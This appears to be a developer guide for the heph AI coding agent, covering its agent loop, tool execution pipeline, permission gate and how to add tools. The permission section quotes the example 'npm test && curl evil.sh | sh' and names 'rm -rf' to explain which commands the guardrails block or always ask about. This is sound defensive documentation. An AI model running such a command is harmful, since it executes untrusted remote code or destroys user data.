# How the heph agent works

A visual guide to the agent loop, the tool system, and where heph sits among modern AI coding agents.
The diagrams match the code as of M4.1. For the folder-level map, see [`project-map.mmd`](../project-map.mmd).

**Contents**

1. [The anatomy of a modern AI agent](#1-the-anatomy-of-a-modern-ai-agent)
2. [The agent loop](#2-the-agent-loop)
3. [One turn, step by step](#3-one-turn-step-by-step)
4. [What happens to a single tool call](#4-what-happens-to-a-single-tool-call)
5. [The permission gate](#5-the-permission-gate)
6. [How to add a tool](#6-how-to-add-a-tool)
7. [Where heph goes next](#7-where-heph-goes-next)

---

## 1. The anatomy of a modern AI agent

Every modern coding agent (heph, Claude Code, Codex CLI, Aider, Cursor's agent) is built from the same five parts.
The language model only produces text and *requests* for tool calls. Everything else is ordinary code around it.

| Part | Job | In heph |
|------|-----|---------|
| **Model** | Decides what to say or which tool to call next | `LLMProvider` → `OpenAICompatibleProvider` (OpenAI, LM Studio) |
| **Loop** | Calls the model again and again until it stops asking for tools | `Agent.runTurn()` |
| **Tools** | The model's hands and eyes: read, search, edit, run | `Tool` + `ToolRegistry` + `ToolExecutor` |
| **Guardrails** | Decide which actions may happen, and ask the human | `PolicyPermissionGate`, `PathGuard`, `WorkspaceWriter`, `DangerousCommandDetector` |
| **Context** | What the model knows: system prompt, history, tool results, project notes | `SystemPromptBuilder`, `Conversation` (M5 adds `HEPH.md`, M6 adds compaction) |

```mermaid
flowchart LR
    human(["Human"])

    subgraph harness["The harness: ordinary code"]
        loop(("Agent loop"))
        context["Context<br/>system prompt · history<br/>tool results · project notes"]
        guard{"Guardrails<br/>permission gate<br/>path guard"}
        tools["Tools<br/>read · search · edit · run"]
    end

    model[["LLM<br/>predicts the next message"]]
    world[("Your project<br/>files · shell")]

    human -->|"task"| loop
    loop -->|"messages + tool schemas"| model
    model -->|"text or tool calls"| loop
    loop <--> context
    loop -->|"tool call"| guard
    guard -->|"ask"| human
    guard -->|"allowed"| tools
    tools <--> world
    tools -->|"result"| loop
    loop -->|"answer"| human

    classDef core fill:#e3f2fd,stroke:#1565c0,color:#0d2a4d
    classDef safe fill:#fdecea,stroke:#c62828,color:#4a0e0e
    classDef ext fill:#eceff1,stroke:#546e7a,color:#1c262b
    class loop,context,tools core
    class guard safe
    class human,model,world ext
```

The key idea: **the model never touches anything.** It can only ask. The harness decides whether the request is valid, whether it is allowed, and what the model sees afterwards.

---

## 2. The agent loop

This is the heart of `src/core/agent/Agent.ts`. A *turn* is everything that happens between your message and heph's final answer.
One turn can call the model many times (a *step* each time), because the model may ask for tools, read the results, and ask for more.

```mermaid
flowchart TD
    start(["User message"]) --> notes["Add queued notes<br/>e.g. 'the user undid your edit'"]
    notes --> add["Append to Conversation"]
    add --> think["step++ · yield 'thinking'"]
    think --> callModel["Call the model with<br/>history + tool definitions<br/>(streamed)"]
    callModel --> stream["Yield 'text' / 'reasoning' deltas<br/>collect tool calls"]
    stream --> err{"Error?"}
    err -->|"yes"| rollback["Remove the whole turn<br/>from history · yield 'error'"]
    err -->|"no"| save["Append assistant message"]
    save --> calls{"Tool calls?"}
    calls -->|"none"| done(["yield 'turn_end'<br/>steps · duration · tokens"])
    calls -->|"yes"| run["For each call, in order:<br/>yield 'tool_start'<br/>ToolRunner.run()<br/>append tool result<br/>yield 'tool_end'"]
    run --> limit{"step < maxSteps (25)?"}
    limit -->|"yes"| think
    limit -->|"no"| warn(["yield 'warning'<br/>and 'turn_end'"])

    ctrlc["Ctrl+C at any point"] -.-> abort(["Keep partial text,<br/>give every tool call a result,<br/>yield 'interrupted'"])

    classDef ok fill:#e8f5e9,stroke:#2e7d32,color:#1b3409
    classDef bad fill:#fdecea,stroke:#c62828,color:#4a0e0e
    classDef dec fill:#fff8e1,stroke:#b8860b,color:#3d2c00
    class done ok
    class rollback,warn,abort bad
    class err,calls,limit dec
```

Design choices worth noticing:

- **`runTurn()` is an async generator.** It `yield`s `AgentEvent`s and never prints anything. The terminal UI renders them, and tests simply collect them into an array. The same agent could drive a web UI without any changes.
- **Tools run one after another, not in parallel.** That is slower but much safer once tools can write: two edits never race each other.
- **The history must always stay valid.** Every tool call gets a result (even "Cancelled"), and a failed turn is removed completely. Otherwise the next request to the API would be rejected.
- **`maxSteps` is a safety net** against a model that keeps calling tools forever, which small local models sometimes do.

---

## 3. One turn, step by step

Here is "What does `src/version.ts` export?" as a sequence. The model needs one tool call, then answers.

```mermaid
sequenceDiagram
    autonumber
    actor You
    participant UI as TerminalUI + ChatRepl
    participant Agent
    participant LLM as LLMProvider
    participant Exec as ToolExecutor
    participant Gate as PermissionGate
    participant WS as Workspace

    You->>UI: "What does src/version.ts export?"
    UI->>Agent: runTurn(input, signal)
    Agent-->>UI: thinking (step 1) → hammer spinner

    Agent->>LLM: chat(messages, tool definitions)
    LLM-->>Agent: tool_call read_file {"path":"src/version.ts"}
    Agent-->>UI: tool_start read_file · src/version.ts

    Agent->>Exec: run(call)
    Exec->>Exec: look up · parse JSON · validate with zod
    Exec->>Gate: check(read_file, risk: read)
    Gate->>UI: first read → ask "Allow reads?"
    You->>UI: a (allow all reads this session)
    UI-->>Gate: allow
    Exec->>WS: read src/version.ts (path-guarded)
    WS-->>Exec: file contents
    Exec-->>Agent: { ok, output: "1\texport const VERSION…", summary: "3 lines" }
    Agent-->>UI: tool_end ✓ 3 lines

    Agent-->>UI: thinking (step 2)
    Agent->>LLM: chat(messages + tool result)
    LLM-->>Agent: text "It exports VERSION…" (streamed)
    Agent-->>UI: text deltas → rendered Markdown
    Agent-->>UI: turn_end (2 steps, tokens, time)
    UI->>You: final answer
```

---

## 4. What happens to a single tool call

`ToolExecutor.run()` sends every call through the same fixed pipeline, and it **never throws**.
When something goes wrong, the model gets a clear error message as the tool result and can try again.
Small local models depend on this feedback loop a lot.

```mermaid
flowchart LR
    toolCall(["ToolCall<br/>name + JSON args"]) --> lookup{"1 · Known<br/>tool?"}
    lookup -->|"no"| e1["Error: Unknown tool.<br/>Available: …"]
    lookup -->|"yes"| parse{"2 · Valid<br/>JSON?"}
    parse -->|"no"| e2["Error: not valid JSON"]
    parse -->|"yes"| validate{"3 · zod<br/>schema ok?"}
    validate -->|"no"| e3["Error: exact<br/>validation message"]
    validate -->|"yes"| preview["4a · preview()<br/>diff / command<br/>(also checks it can work)"]
    preview --> gate{"4b · Permission<br/>gate"}
    gate -->|"deny"| refused["NOT APPLIED: …<br/>do not retry"]
    gate -->|"allow"| exec["5 · execute()"]
    exec -->|"throws"| e4["Error: message"]
    exec -->|"ok"| trunc["6 · Truncate to 20k chars<br/>(keep head + tail)"]
    trunc --> result(["ToolOutcome<br/>ok · output · summary"])
    e1 & e2 & e3 & e4 & refused --> back(["Sent back to the model<br/>as the tool result"])
    result --> back

    classDef err fill:#fdecea,stroke:#c62828,color:#4a0e0e
    classDef dec fill:#fff8e1,stroke:#b8860b,color:#3d2c00
    classDef ok fill:#e8f5e9,stroke:#2e7d32,color:#1b3409
    class e1,e2,e3,e4,refused err
    class lookup,parse,validate,gate dec
    class result,back ok
```

Two details matter here:

- **The preview comes before the question.** For an edit, the preview is the diff. If the text to replace isn't found, the preview fails and you are never asked to approve an impossible change.
- **A refusal is not an error.** It starts with `NOT APPLIED:`, so the model knows that nothing changed. Without that wording, models claimed changes they never made.

---

## 5. The permission gate

`PolicyPermissionGate` decides on every call. The rules are checked in order, and the **first match wins**.

```mermaid
flowchart TD
    req(["Tool call + preview"]) --> r1{"Read tool?"}
    r1 -->|"yes"| r1a{"reads: auto, or mode is<br/>auto-edit / full-auto,<br/>or 'a' answered before?"}
    r1a -->|"yes"| allow(["ALLOW"])
    r1a -->|"no"| ask(["ASK the human"])
    r1 -->|"no"| r2{"Mode is<br/>read-only?"}
    r2 -->|"yes"| deny(["DENY"])
    r2 -->|"no"| r3{"Config DENY<br/>rule matches?"}
    r3 -->|"yes"| deny
    r3 -->|"no"| r4{"Command looks<br/>dangerous?"}
    r4 -->|"yes"| ask
    r4 -->|"no"| r5{"Config ALLOW rule,<br/>earlier 'always', or mode<br/>auto-approves this risk?"}
    r5 -->|"yes"| allow
    r5 -->|"no"| ask
    ask --> human{"You answer<br/>y / a / n"}
    human -->|"y or a"| allow
    human -->|"n"| deny

    classDef ok fill:#e8f5e9,stroke:#2e7d32,color:#1b3409
    classDef bad fill:#fdecea,stroke:#c62828,color:#4a0e0e
    classDef q fill:#fff8e1,stroke:#b8860b,color:#3d2c00
    class allow ok
    class deny bad
    class ask,human q
```

Dangerous commands (rule 4) come *before* the allow rules on purpose: `rm -rf` always asks, even in `full-auto` mode.
Allow rules also never match commands that contain `;`, `&&`, `|`, `>` or `$(`, so `npm test && curl evil.sh | sh` can't hide behind an `npm test` rule.

The gate covers *whether* an action may happen. Separately, `PathGuard` and `WorkspaceWriter` cover *where* it may happen.
They block paths outside the project, secrets, `.git/` and `.heph/`, and edits to files the model hasn't read. **These checks apply even after you approve.**

---

## 6. How to add a tool

Tools follow the Open/Closed principle: you add a class and register it, and nothing else changes.
The agent doesn't know which tools exist. It only talks to the `ToolRunner` port.

```mermaid
classDiagram
    direction LR
    class ToolRunner {
        <<port, core/>>
        definitions() ToolDefinition[]
        describe(call) string
        run(call, signal) ToolOutcome
    }
    class ToolExecutor {
        lookup → parse → validate
        preview → gate → execute → truncate
    }
    class ToolRegistry {
        register(tool)
        get(name)
        definitions() zod → JSON Schema
    }
    class Tool~TArgs~ {
        <<interface>>
        name
        description
        schema: zod
        risk: read | write | execute
        describe(args)
        preview?(args, ctx)
        execute(args, ctx)
    }
    class ReadFileTool
    class EditFileTool
    class RunCommandTool
    class YourNewTool {
        your logic here
    }

    ToolRunner <|.. ToolExecutor : implements
    ToolExecutor --> ToolRegistry
    ToolRegistry o-- Tool
    Tool <|.. ReadFileTool
    Tool <|.. EditFileTool
    Tool <|.. RunCommandTool
    Tool <|.. YourNewTool
```

### The five steps

```mermaid
flowchart LR
    s1["1 · Create<br/>src/tools/&lt;group&gt;/MyTool.ts"] --> s2["2 · Define the zod schema<br/>with .describe() on every field"]
    s2 --> s3["3 · Write name, description,<br/>risk, describe(), execute()<br/>(+ preview() if it changes things)"]
    s3 --> s4["4 · Register it in<br/>container.ts"]
    s4 --> s5["5 · Test it in tests/unit/tools/<br/>then try it on LM Studio"]
```

A minimal read-only tool:

```ts
import { z } from 'zod';
import type { Tool, ToolContext, ToolResult } from '../Tool.js';

const schema = z.object({
  path: z.string().min(1).describe('File to count lines in, relative to the workspace root.'),
});
type Args = z.infer<typeof schema>;

export class CountLinesTool implements Tool<Args> {
  readonly name = 'count_lines';
  // The model sees only the name, the description and the schema. Write them for the model.
  readonly description = 'Count the lines in a text file. Cheaper than read_file for big files.';
  readonly schema = schema;
  readonly risk = 'read' as const; // read | write | execute: decides how the gate treats it

  describe(args: Args): string {
    return args.path; // shown next to the tool line in the UI
  }

  async execute(args: Args, { workspace }: ToolContext): Promise<ToolResult> {
    const text = (await workspace.readFile(args.path)).toString('utf8'); // ALWAYS via the Workspace
    const lines = text.split('\n').length;
    return { output: `${lines} lines`, summary: `${lines} lines` };
  }
}
```

Then register it in `src/container.ts`:

```ts
const registry = new ToolRegistry()
  .register(new ReadFileTool(deps.reads))
  // …
  .register(new CountLinesTool());
```

**Rules for good tools**

- **The description is the documentation for the model.** Say *when* to use the tool, not only what it does. Point to alternatives ("Use grep instead for…").
- **Errors should teach.** Throw messages that tell the model what to do next: `File not found: "x". Use glob to find it.`
- **Keep the output compact.** Every character costs tokens, and the executor cuts anything above 20k characters.
- **Write and execute tools** need `preview()` and their extra dependencies (`WorkspaceWriter`, `Shell`) through the constructor. They also need a test proving they can't run without approval in `ask` mode.
- **File access goes only through `Workspace` / `WorkspaceWriter`**, never `node:fs`. That keeps path escapes impossible.

---

## 7. Where heph goes next

What heph has now, compared with what full-featured agents add on top:

```mermaid
flowchart LR
    subgraph done["Built (M0–M4)"]
        a1["Streaming chat<br/>any OpenAI-compatible API"]
        a2["Agent loop<br/>+ read / search tools"]
        a3["Edit / write with diff approval<br/>+ /undo checkpoints"]
        a4["run_command<br/>danger detection · allow/deny rules"]
    end

    subgraph next["Roadmap (M5–M7)"]
        b1["M5 · heph run one-shot<br/>HEPH.md project instructions<br/>audit log"]
        b2["M6 · context management<br/>truncate → summarise<br/>save / resume sessions"]
        b3["M7 · v1.0 release<br/>npm heph-cli"]
    end

    subgraph modern["Modern agent features (stretch)"]
        c1["MCP client<br/>tools from any MCP server"]
        c2["Plan mode<br/>propose, then edit"]
        c3["Sub-agents<br/>isolated researcher context"]
        c4["Sandboxed execution<br/>Docker"]
        c5["Eval harness<br/>pass rate per model"]
    end

    done --> next --> modern

    classDef d fill:#e8f5e9,stroke:#2e7d32,color:#1b3409
    classDef n fill:#e3f2fd,stroke:#1565c0,color:#0d2a4d
    classDef m fill:#f3e5f5,stroke:#7b1fa2,color:#2e0b3a
    class a1,a2,a3,a4 d
    class b1,b2,b3 n
    class c1,c2,c3,c4,c5 m
```

Most of these features drop into the existing ports without touching `core/`:

- **MCP** is another way to fill the `ToolRegistry`: an adapter turns each MCP tool into a `Tool`.
- **Sub-agents** are a `Tool` whose `execute()` runs a second `Agent` with read-only tools and its own `Conversation`.
- **Plan mode** is a `PermissionMode` plus a system-prompt change.
- **A sandbox** is another `Shell` implementation.
